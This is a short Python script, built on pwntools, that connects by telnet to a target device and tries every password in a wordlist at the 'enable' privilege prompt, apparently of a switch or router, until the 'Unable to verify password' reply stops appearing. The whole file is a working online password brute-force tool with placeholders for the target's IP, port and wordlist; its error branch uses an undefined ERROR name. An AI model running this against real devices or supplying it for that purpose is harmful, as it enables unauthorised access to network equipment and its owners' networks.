from pwn import *
import os.path

wordlistPath = 'PATH' 	# set your own wordlist path
FAIL = '\033[91m'
PENDING = '\033[93m'
FOUND = '\033[92m'
ENDC = '\033[0m'

connection = remote('IP', PORT)				# set your target's IP and telnet port
for i in range(18):
	connection.recvline()
#connection.send(b'operator\x0D')			# uncomment this line if it's the first time you log
#connection.send(b'\x0D')        			# uncomment this line if it's the first time you log
connection.send(b'\x0D')
if os.path.isfile(wordlistPath):
	with open(wordlistPath, 'r') as wordlist:
		wordSet = set(line.strip() for line in wordlist)
	for i in range(3):
		connection.recvline()
	for word in wordSet:
		connection.send(b'enable\x0D')
		connection.send(b'manager\x0D')
		print ('trying ' + PENDING + word + ENDC)
		connection.send(bytes(word + '\x0D', encoding="utf-8"))
		for i in range(2):
			connection.recvline()
		output = connection.recvline()
		if (b'Unable to verify password' not in output):
			print ("found password " + FOUND + word + ENDC)
			break
	connection.send(b'exit\x0D')
	connection.send(b'y\x0D')
else:
	print (ERROR + 'wordlist not found' + ENDC)
	connection.send(b'exit\x0D')
	connection.send(b'y\x0D')

